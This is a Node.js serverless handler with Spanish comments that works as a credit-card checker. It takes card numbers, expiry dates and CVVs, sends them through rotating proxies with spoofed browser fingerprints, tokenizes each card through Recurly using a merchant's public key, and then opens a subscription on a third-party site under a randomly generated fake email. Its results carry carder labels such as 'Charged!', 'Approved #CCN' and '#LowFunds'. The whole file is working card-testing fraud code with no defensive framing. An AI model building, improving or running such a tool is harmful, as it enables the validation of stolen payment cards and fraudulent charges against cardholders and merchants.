const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');

// Sistema de Proxies
class ProxyManager {
    constructor() {
        this.enabled = true; // Activado por defecto
        this.proxiesPath = path.join(process.cwd(), 'api', 'proxies.txt'); // Ruta para Vercel
        this.proxies = [];
        this.loadProxies();
    }

    loadProxies() {
        if (!this.enabled) {
            console.log('Proxy system is disabled');
            return;
        }

        try {
            if (fs.existsSync(this.proxiesPath)) {
                const content = fs.readFileSync(this.proxiesPath, 'utf8');
                this.proxies = content
                    .split('\n')
                    .filter(line => line.trim())
                    .map(line => {
                        const [host, port, username, password] = line.trim().split(':');
                        return { host, port, auth: { username, password } };
                    });
                console.log(`Loaded ${this.proxies.length} proxies`);
            } else {
                // Si no se encuentra el archivo, usar proxies hardcodeados
                console.log(`Proxy file not found at ${this.proxiesPath}. Using hardcoded proxies.`);
                // Añade aquí tus proxies hardcodeados
                this.proxies = [];
            }
        } catch (error) {
            console.error('Error loading proxies:', error);
            this.proxies = [];
        }
    }

    getRandomProxy() {
        if (!this.enabled || this.proxies.length === 0) return null;
        return this.proxies[Math.floor(Math.random() * this.proxies.length)];
    }

    createProxyAgent(proxy) {
        if (!this.enabled || !proxy) return null;
        try {
            const proxyUrl = `http://${proxy.auth.username}:${proxy.auth.password}@${proxy.host}:${proxy.port}`;
            return new HttpsProxyAgent(proxyUrl);
        } catch (error) {
            console.error('Error creating proxy agent:', error);
            return null;
        }
    }
}

// Instancia del gestor de proxies
const proxyManager = new ProxyManager();

// Función para generar email aleatorio
function generateRandomEmail() {
    const names = ['john', 'jane', 'mike', 'sara', 'alex', 'emma', 'james', 'lisa'];
    const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
    const name = names[Math.floor(Math.random() * names.length)];
    const randomNum = Math.floor(Math.random() * 1000);
    const domain = domains[Math.floor(Math.random() * domains.length)];
    return `${name}${randomNum}@${domain}`;
}

// Función de espera
async function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Función principal para verificar tarjeta
async function checkRecurly(cardNumber, month, year, cvv) {
    const startTime = Date.now();
    let proxyUsed = 'Direct';
    
    try {
        // Obtener proxy para el token
        const tokenProxy = proxyManager.getRandomProxy();
        let tokenProxyAgent = null;
        
        if (tokenProxy) {
            tokenProxyAgent = proxyManager.createProxyAgent(tokenProxy);
            proxyUsed = `${tokenProxy.host}:${tokenProxy.port}`;
            console.log(`Using proxy for token: ${proxyUsed}`);
        }
        
        // Paso 1: Crear token
        const tokenResponse = await axios.post(
            'https://api.recurly.com/js/v1/token',
            new URLSearchParams({
                'first_name': 'Bruno',
                'last_name': 'Alexis',
                'number': cardNumber,
                'browser[color_depth]': '24',
                'browser[java_enabled]': 'false',
                'browser[language]': 'es-US',
                'browser[referrer_url]': 'https://mysticinsight.online/mi/subscription',
                'browser[screen_height]': '1280',
                'browser[screen_width]': '800',
                'browser[time_zone_offset]': '420',
                'browser[user_agent]': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'month': month,
                'year': year,
                'cvv': cvv,
                'version': '4.33.1',
                'key': 'ewr1-GHqWaQhLRDLkFqmH9MVxeE',
                'deviceId': 'siaXX9TbekYH1S1C',
                'sessionId': 'Z0VJJh0T0F7Zuwmq',
                'instanceId': 'jGAuKKML687jvFC0'
            }).toString(),
            {
                headers: {
                    'authority': 'api.recurly.com',
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://api.recurly.com',
                    'referer': 'https://api.recurly.com/js/v1/field.html',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                },
                httpsAgent: tokenProxyAgent
            }
        );
        
        const token = tokenResponse.data.id;
        console.log('Token created:', token);
        
        // Esperar un segundo
        await delay(1000);
        
        // Obtener proxy para la suscripción (puede ser diferente)
        const subProxy = proxyManager.getRandomProxy();
        let subProxyAgent = null;
        let subProxyInfo = 'Direct';
        
        if (subProxy) {
            subProxyAgent = proxyManager.createProxyAgent(subProxy);
            subProxyInfo = `${subProxy.host}:${subProxy.port}`;
            console.log(`Using proxy for subscription: ${subProxyInfo}`);
        }
        
        // Paso 2: Crear suscripción
        const paymentResponse = await axios.post(
            'https://subtrack.turbograms.com/rec/create-subscription-no-user',
            {
                plan_id: 'msi_lpr_6month',
                token_id: token,
                email: generateRandomEmail(),
                attribution: {
                    event_source_url: 'https://mysticinsight.online/mi/subscription',
                    client_user_agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            },
            {
                headers: {
                    'authority': 'subtrack.turbograms.com',
                    'content-type': 'text/plain',
                    'origin': 'https://mysticinsight.online',
                    'referer': 'https://mysticinsight.online/',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                },
                httpsAgent: subProxyAgent
            }
        );
        
        // Actualizar información de proxy
        if (proxyUsed !== 'Direct' && subProxyInfo !== 'Direct') {
            proxyUsed = `${proxyUsed}→${subProxyInfo}`;
        } else if (subProxyInfo !== 'Direct') {
            proxyUsed = subProxyInfo;
        }
        
        // Procesar respuesta
        let status, message;
        
        if (paymentResponse.status === 302 || paymentResponse.headers.location) {
            status = "approved";
            message = "Charged! 🟩 [ $1.00 ]";
        } else if (paymentResponse.data?.error?.toLowerCase().includes('insufficient funds')) {
            status = "approved";
            message = "Approved! #LowFunds 🟩";
        } else if (paymentResponse.data?.error?.toLowerCase().includes('cvv') || 
                  paymentResponse.data?.error?.toLowerCase().includes('security code')) {
            status = "approved";
            message = "Approved #CCN! 🟩";
        } else {
            status = "declined";
            message = "Declined. 🔴";
        }
        
        // Preparar resultado
        return {
            success: true,
            card: {
                number: `${cardNumber.substring(0, 6)}xxxxxx${cardNumber.substring(cardNumber.length - 4)}`,
                brand: getBrandFromNumber(cardNumber),
                bank: getBankFromNumber(cardNumber),
                type: getTypeFromNumber(cardNumber)
            },
            result: message,
            status: status,
            time: ((Date.now() - startTime) / 1000).toFixed(1),
            proxy: proxyUsed
        };
        
    } catch (error) {
        console.error('Error in check process:', error.message);
        
        // Manejar errores específicos
        if (error.response?.data?.error?.toLowerCase().includes('cvv') || 
            error.response?.data?.error?.toLowerCase().includes('security code')) {
            return {
                success: true,
                card: {
                    number: `${cardNumber.substring(0, 6)}xxxxxx${cardNumber.substring(cardNumber.length - 4)}`,
                    brand: getBrandFromNumber(cardNumber),
                    bank: getBankFromNumber(cardNumber),
                    type: getTypeFromNumber(cardNumber)
                },
                result: "Approved #CCN! 🟩",
                status: "approved",
                time: ((Date.now() - startTime) / 1000).toFixed(1),
                proxy: proxyUsed
            };
        }
        
        return {
            success: false,
            message: error.message || 'Error checking card',
            error: error.toString(),
            proxy: proxyUsed
        };
    }
}

// Funciones auxiliares
function getBrandFromNumber(cardNumber) {
    if (cardNumber.startsWith('4')) return 'VISA';
    if (cardNumber.startsWith('5')) return 'MASTERCARD';
    if (cardNumber.startsWith('3')) return 'AMEX';
    if (cardNumber.startsWith('6')) return 'DISCOVER';
    return 'UNKNOWN';
}

function getBankFromNumber(cardNumber) {
    // Simulación simple de banco basada en BIN
    const bin = cardNumber.substring(0, 6);
    return `BANK (${bin})`;
}

function getTypeFromNumber(cardNumber) {
    // Simulación de tipo basada en último dígito
    return parseInt(cardNumber.slice(-1)) % 2 === 0 ? 'CREDIT' : 'DEBIT';
}

// Generar un nuevo token
function generateNewToken() {
    return Math.random().toString(36).substring(2, 15) + 
           Math.random().toString(36).substring(2, 15);
}

// Manejador principal
module.exports = async (req, res) => {
    // Habilitar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Authorization, Content-Type');
    
    // Manejar OPTIONS para preflight
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Solo permitir POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        // Verificar que hay un header de autorización (no validamos el token específico)
        const authHeader = req.headers['authorization'];
        
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                message: 'Authentication required'
            });
        }
        
        // Verificar datos de la tarjeta
        const { cardNumber, month, year, cvc } = req.body;
        
        if (!cardNumber || !month || !year || !cvc) {
            return res.status(400).json({ 
                success: false, 
                message: 'Missing required card details' 
            });
        }
        
        // Verificar tarjeta
        const result = await checkRecurly(cardNumber, month, year, cvc);
        
        // Generar nuevo token para la siguiente solicitud
        const newToken = generateNewToken();
        result.token = newToken;
        
        return res.status(200).json(result);
    } catch (error) {
        console.error('Handler error:', error);
        return res.status(500).json({
            success: false,
            message: 'Server error during card check',
            error: error.message || 'Unknown error'
        });
    }
};
